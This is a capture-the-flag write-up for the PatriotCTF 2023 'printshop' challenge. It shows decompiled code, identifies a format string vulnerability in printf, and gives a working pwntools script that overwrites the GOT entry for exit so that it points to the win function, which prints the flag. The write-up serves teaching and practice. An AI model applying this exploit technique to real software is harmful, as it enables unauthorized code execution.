---
title: printshop - pwn - PatriotCTF 2023
slug: printshop
published: 2023-09-29
author: kako57
description: Automated Format String Exploitation using pwntools
---

## About the challenge

This binary was for the challenge printshop in PatriotCTF 2023.


[Link to binary](/files/printshop/printshop)

## Initial Exploration

We were only given the binary and no other libraries.

```
$ pwn checksec printshop
[*] '/ctfs/patriot-ctf/printshop/printshop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Reversing the binary

Decompiling the main function in radare2 (with r2ghidra), we get this:

```c
void main noreturn (void)

{
    int64_t in_FS_OFFSET;
    ulong format;
    ulong var_8h;
    
    var_8h = *(in_FS_OFFSET + 0x28);
    sym.imp.puts("\nWelcome to the Print Shop!");
    sym.imp.printf("\nWhat would you like to print? >> ");
    sym.imp.fgets(&format, 100, _reloc.stdin);
    sym.imp.puts("\nThank you for your buisness!\n");
    sym.imp.printf(&format);
    // WARNING: Subroutine does not return
    sym.imp.exit(0);
}
```

There is also another function that prints us the flag:

```c
void sym.win(void)

{
    int64_t iVar1;
    char c;
    ulong stream;

    iVar1 = sym.imp.fopen("flag.txt", 0x402008);
    if (iVar1 == 0) {
        sym.imp.puts("Flag is missing, contact an organizer.");
        sym.imp.fflush(_reloc.stdout);
    // WARNING: Subroutine does not return
        sym.imp.exit(1);
    }
    c = sym.imp.fgetc(iVar1);
    while (c != -1) {
        sym.imp.putchar(c);
        sym.imp.fflush(_reloc.stdout);
        c = sym.imp.fgetc();
    }
    sym.imp.fclose(iVar1);
    return;
}
```

## Identifying the vulnerability

In this binary, there is a vulnerability in the main function: `sym.imp.printf(&format)`, which is a format string vulnerability. This is because format can be modified by user input.

## Exploitation

### Steps

1. Know how to communicate to the program, so we can reach the vulnerable `printf` call
2. Figure out how to trigger the format string vuln
3. Find the correct offset that allows us to have enough arbitrary write in the memory segment we want to overwrite.
4. Plan a GOT overwrite so `exit` points to `win`.
5. Craft the payload that uses the correct offsets and correct format specifiers to do the GOT overwrite.
6. When it runs, the `printf` should trigger GOT overwrite, and once `exit` is called, it should print the contents of `flag.txt`.

### How do we communicate to the program?

To exploit this, we can use the `pwnlib.fmtstr` module from pwntools. We can define how the payload will be sent, so we can automate the creation of the payload later, while our  following the input/output sequence the vulnerable program expects.

```python
from pwn import *

elf = context.binary = ELF('./printshop')

def get_io():
    if args.REMOTE:
        # nc chal.pctf.competitivecyber.club 7997
        io = remote('chal.pctf.competitivecyber.club', 7997)
    else:
        io = process(elf.path)
    return io

# format string exploit helper
def send_payload(payload):
    print('payload: ', payload)
    print('payload length: ', len(payload))
    io = get_io()
    io.sendlineafter('>> ', payload)
    ret = io.recvall()
    # just find the flag in the output and print it if it's there
    if ret is not None and b'pctf' in ret:
        print(ret)
    return ret
```

## How do we get to the `win` function?

The vulnerable `printf()` call, the program immediately exits by calling `sym.imp.exit(0)`. We can do a GOT overwrite where we change the function pointed at the GOT for the calls to `exit()` and make it point to `win()` instead. If we do this, when `sym.imp.exit(0)` is called, the program jumps to `win()` instead of the implementation of `exit` provided by libc.

Because we have set up how we send the payload, we can just automate the exploit with the following code:

```python
sheeesh = FmtStr(execute_fmt=send_payload)
sheeesh.write(elf.got['exit'], elf.sym['win'])
sheeesh.execute_writes()
```
